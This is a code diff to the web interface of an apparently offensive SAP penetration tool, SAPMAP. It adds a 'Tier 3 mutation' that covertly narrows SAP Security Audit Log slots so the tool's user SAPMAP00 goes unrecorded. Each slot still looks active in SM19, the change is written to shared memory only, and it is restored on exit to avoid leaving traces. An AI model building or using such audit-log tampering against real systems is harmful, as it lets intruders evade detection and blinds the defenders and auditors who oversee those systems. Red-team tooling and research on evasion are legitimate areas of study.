@@ -1045,6 +1045,9 @@ body {
       <div class="ctx-item" data-action="tier3_rdisp_trace_off"
            title="Tier 3 MUTATION. Sets rdisp/TRACE=0 (dispatcher trace level) via TH_CHANGE_PARAMETER (shared memory only — no profile-file rewrite). Stops dev_disp / dev_w* dispatcher and work-process trace writes. Auto-restores baseline value on exit. Confirmed runtime-changeable on S/4 793."
            >&#128683; Suppress Dispatcher Trace (Tier 3 mutation)</div>
+      <div class="ctx-item" data-action="tier3_sal_uname_narrow"
+           title="Tier 3 MUTATION. Swaps one or more SAL slots' UNAME filter to a replacement value (e.g. operator's real user) for a hold window. Slot stays STATUS='X' (looks active in SM19) but no longer matches SAPMAP00. Stealth path only (RSAU_UPD_AUDIT_CONFIG, SHM-only — no disk persistence, no SM19 header change). Baseline UNAMEs auto-restored on exit."
+           >&#129399; Narrow SAL Slot UNAME... (Tier 3 mutation)</div>
     </div>
   </div>
   <!-- Data Extraction submenu -->
@@ -4128,6 +4131,9 @@ function showCtxMenu(e, sid) {
     'tier3_rdisp_trace_off': hasUsableAbapAccess
         && !!(mapState.evasion && mapState.evasion.allow_evasion)
         && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
+    'tier3_sal_uname_narrow': hasUsableAbapAccess
+        && !!(mapState.evasion && mapState.evasion.allow_evasion)
+        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
     'retrieve_rfcs':    hasUsableAbapAccess,        // ABAP-only RFC + BAPI
     'test_rfcs':        hasUsableAbapAccess && hasRFCs,
     'read_java_destinations': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
@@ -4343,6 +4349,12 @@ function showCtxMenu(e, sid) {
          : ((mapState.evasion && mapState.evasion.allow_evasion)
             ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
             : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
+    'tier3_sal_uname_narrow':
+        ((mapState.evasion && mapState.evasion.allow_evasion && mapState.evasion.baseline_captured_at)
+         ? 'MUTATES kernel state. Calls RSAU_UPD_AUDIT_CONFIG to swap one or more active SAL slots\' UNAME filter (e.g. \'*\' → operator\'s real user) for a hold window. Slot stays STATUS=X (appears active in SM19) but no longer matches SAPMAP00. Stealth path only — shared memory write, no disk persistence. Baseline UNAMEs auto-restored on exit.'
+         : ((mapState.evasion && mapState.evasion.allow_evasion)
+            ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
+            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
     'retrieve_rfcs':    'Needs a verified RFC credential or a SAPMAP-created user — RSRFCCHK and the RFCDES read both require a working logon.',
     'test_rfcs':        (!hasRFCs
         ? 'Retrieve RFC connections first.'
@@ -4444,6 +4456,7 @@ function showCtxMenu(e, sid) {
     'tier3_sal_slot_disable': !isAbapStack,
     'tier3_gw_logging_off': !isAbapStack,
     'tier3_rdisp_trace_off': !isAbapStack,
+    'tier3_sal_uname_narrow': !isAbapStack,
     'retrieve_rfcs':    !isAbapStack,
     'test_rfcs':        !isAbapStack,
     'create_tcpip':          !isAbapStack,
@@ -5688,6 +5701,75 @@ async function ctxAction(action) {
         `${sid}: Tier 3 — setting ${param}=${val}...`, 3000);
       await api('POST', `node/${sid}/tier3_set_param`,
                  {param: param, value: val});
+      break;
+    }
+    case 'tier3_sal_uname_narrow': {
+      const slotno = prompt(
+        'Tier 3: narrow which SAL slot(s) on ' + sid + '?\n\n'
+        + 'Accepted forms:\n'
+        + '  • single slot:    1   (or 0001)\n'
+        + '  • multiple slots: 1,2,3\n'
+        + '  • everything currently active: ALL\n\n'
+        + 'The slot stays STATUS=\'X\' (active in SM19) but its '
+        + 'UNAME filter gets swapped so SAPMAP00 no longer matches.',
+        '1');
+      if (!slotno) break;
+      const replacement = prompt(
+        'Replace UNAME with which value?\n\n'
+        + 'Common choices:\n'
+        + '  • your real operator user (e.g. JORIS, BASIS)\n'
+        + '  • a wildcard that excludes SAPMAP00 (e.g. A*)\n'
+        + '  • a sentinel that matches nothing (e.g. NEVER)\n\n'
+        + 'The slot will only record events where the user matches '
+        + 'this pattern.  Baseline UNAME auto-restored on exit.',
+        '');
+      if (!replacement) break;
+      const holdRaw = prompt(
+        'Hold UNAME swap for how many seconds before auto-restore?',
+        '5');
+      if (!holdRaw) break;
+      const hold = parseFloat(holdRaw);
+      if (isNaN(hold) || hold < 0 || hold > 600) {
+        showToast('Hold seconds must be a number between 0 and 600',
+                   'warning');
+        break;
+      }
+      if (!confirm(
+        'RUN Tier 3 SAL UNAME narrow on ' + sid + '?\n\n'
+        + 'Slot(s):       ' + slotno + '\n'
+        + 'New UNAME:     ' + replacement + '\n'
+        + 'Hold:          ' + hold + 's\n\n'
+        + 'Writer: RSAU_UPD_AUDIT_CONFIG (shared-memory only — '
+        + 'no disk persistence, no SM19 header change).\n\n'
+        + 'Slot STATUS stays X (still appears active in SM19) but '
+        + 'no longer matches SAPMAP00.')) break;
+      flashActivity(
+        `${sid}: Tier 3 — swapping SAL UNAME...`, 5000);
+      await api('POST', `node/${sid}/tier3_sal_uname_narrow`,
+                 {slotno: slotno,
+                  replacement_uname: replacement,
+                  hold_seconds: hold});
+      let unRemaining = Math.ceil(hold);
+      const ukey = '_uname_cd_' + sid;
+      activeTasks[ukey] =
+        '\u{1F977} SAL slot(s) ' + slotno + ' UNAME→'
+        + replacement + ' — ' + unRemaining + 's';
+      updateActivityBar();
+      const ucdTimer = setInterval(() => {
+        unRemaining--;
+        if (unRemaining > 0) {
+          activeTasks[ukey] =
+            '\u{1F977} SAL slot(s) ' + slotno + ' UNAME→'
+            + replacement + ' — ' + unRemaining + 's';
+        } else if (unRemaining === 0) {
+          activeTasks[ukey] =
+            '\u{2705} SAL slot(s) ' + slotno + ' — restoring UNAME...';
+        } else {
+          delete activeTasks[ukey];
+          clearInterval(ucdTimer);
+        }
+        updateActivityBar();
+      }, 1000);
       break;
     }
     case 'retrieve_rfcs':
